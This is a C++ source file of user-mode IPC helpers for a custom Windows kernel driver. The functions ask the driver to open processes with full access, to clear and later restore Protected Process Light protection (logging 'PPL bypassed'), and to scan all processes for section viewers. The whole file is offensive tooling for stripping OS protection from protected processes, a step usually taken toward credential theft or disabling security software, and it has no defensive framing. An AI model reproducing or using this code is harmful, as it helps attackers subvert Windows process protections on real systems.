#include "DriverIpc.h"
#include "Globals.h"
#include <cstdio>

// Shared helper: waits up to timeoutMs for req->isValid to go FALSE.
static bool WaitIpcDone(PVOID section, DWORD timeoutMs)
{
    auto* hdr = static_cast<VAD_MODIFY_REQUEST*>(section);
    DWORD w = 0;
    while (hdr->isValid && w < timeoutMs) { Sleep(10); w += 10; }
    return !hdr->isValid;
}

bool Ipc_SetKernelContext(IpcCtx* ipc, const char* source, const char* target)
{
    UpdateInitData(ipc->SymbolsArray, source, target,
                   (unsigned long long)ipc->sourceVA, 0, 0);
    if (!SetEvent(ipc->hEventINIT)) {
        printf("[-] Ipc_SetKernelContext: SetEvent(hEventINIT) failed: %lu\n", GetLastError());
        return false;
    }
    Sleep(150); // allow INITWorkerThread to process
    return true;
}

bool Ipc_OpenProcess(IpcCtx* ipc, HANDLE* hOut, DWORD* pidOut)
{
    auto* req = static_cast<PVAD_MODIFY_REQUEST>(ipc->VadModifyArray);
    memset(req, 0, sizeof(VAD_MODIFY_REQUEST));
    memcpy(req->identifier, "OPRC", 4);
    req->Protection = 0; // PROCESS_ALL_ACCESS
    req->isValid    = TRUE;

    if (!SetEvent(ipc->hEventVAD_INSERT)) {
        printf("[-] Ipc_OpenProcess: SetEvent failed: %lu\n", GetLastError());
        return false;
    }
    if (!WaitIpcDone(req, 3000)) {
        printf("[-] Ipc_OpenProcess: driver did not respond within 3s\n");
        return false;
    }
    if (req->Result != 0 || !req->HandleResult) {
        printf("[-] Ipc_OpenProcess: OPRC failed 0x%08lX\n", (ULONG)req->Result);
        return false;
    }

    *hOut   = (HANDLE)(ULONG_PTR)req->HandleResult;
    *pidOut = GetProcessId(*hOut);
    printf("[+] Ipc_OpenProcess: handle 0x%p  PID=%lu\n", *hOut, *pidOut);
    return true;
}

bool Ipc_ClearProtection(IpcCtx* ipc, UCHAR* savedOut)
{
    *savedOut = 0;
    auto* req = static_cast<PVAD_MODIFY_REQUEST>(ipc->VadModifyArray);
    memset(req, 0, sizeof(VAD_MODIFY_REQUEST));
    memcpy(req->identifier, "PPRT", 4);
    req->Protection = 0;
    req->isValid    = TRUE;

    if (!SetEvent(ipc->hEventVAD_INSERT)) {
        printf("[-] Ipc_ClearProtection: SetEvent failed: %lu\n", GetLastError());
        return false;
    }
    if (!WaitIpcDone(req, 2000)) {
        printf("[-] Ipc_ClearProtection: driver did not respond within 2s\n");
        return false;
    }
    if (req->Result != 0) {
        printf("[!] Ipc_ClearProtection: PPRT clear failed 0x%08lX\n", (ULONG)req->Result);
        return false;
    }

    *savedOut = (UCHAR)req->HandleResult;
    if (*savedOut)
        printf("[+] Ipc_ClearProtection: Protection cleared (was 0x%02X) — PPL bypassed\n", *savedOut);
    else
        printf("[*] Ipc_ClearProtection: process is not PPL (Protection was 0)\n");
    return true;
}

bool Ipc_RestoreProtection(IpcCtx* ipc, UCHAR saved)
{
    if (!saved) return true; // nothing to restore

    auto* req = static_cast<PVAD_MODIFY_REQUEST>(ipc->VadModifyArray);
    memset(req, 0, sizeof(VAD_MODIFY_REQUEST));
    memcpy(req->identifier, "PPRT", 4);
    req->Protection = saved;
    req->isValid    = TRUE;

    if (!SetEvent(ipc->hEventVAD_INSERT)) {
        printf("[-] Ipc_RestoreProtection: SetEvent failed: %lu\n", GetLastError());
        return false;
    }
    if (!WaitIpcDone(req, 2000)) {
        printf("[-] Ipc_RestoreProtection: driver did not respond within 2s\n");
        return false;
    }
    printf("[+] Ipc_RestoreProtection: Protection restored to 0x%02X\n", saved);
    return true;
}

bool Ipc_FindSectionViewers(IpcCtx* ipc, ULONG64 targetCA, SFND_RESULT* out)
{
    auto* sr = static_cast<SFND_RESULT*>(ipc->VadModifyArray);
    memset(sr, 0, sizeof(SFND_RESULT));
    memcpy(sr->identifier, "SFND", 4);
    sr->TargetControlArea = targetCA;  // written at StartingVpn offset — matches kernel read
    sr->isValid           = TRUE;      // written at VAD_MODIFY_REQUEST.isValid offset

    if (!SetEvent(ipc->hEventVAD_INSERT)) {
        printf("[-] Ipc_FindSectionViewers: SetEvent failed: %lu\n", GetLastError());
        return false;
    }

    // Wait with timeout — SFND walks all processes so give it up to 10s.
    // Use WaitForSingleObject on a re-check interval rather than a pure spin.
    DWORD deadline = GetTickCount() + 10000;
    while (sr->isValid) {
        DWORD remaining = deadline - GetTickCount();
        if (remaining == 0 || remaining > 10000) {
            printf("[-] Ipc_FindSectionViewers: driver did not respond within 10s\n");
            return false;
        }
        WaitForSingleObject(GetCurrentProcess(), min(remaining, 20));
    }

    memcpy(out, sr, sizeof(SFND_RESULT));
    return true;
}
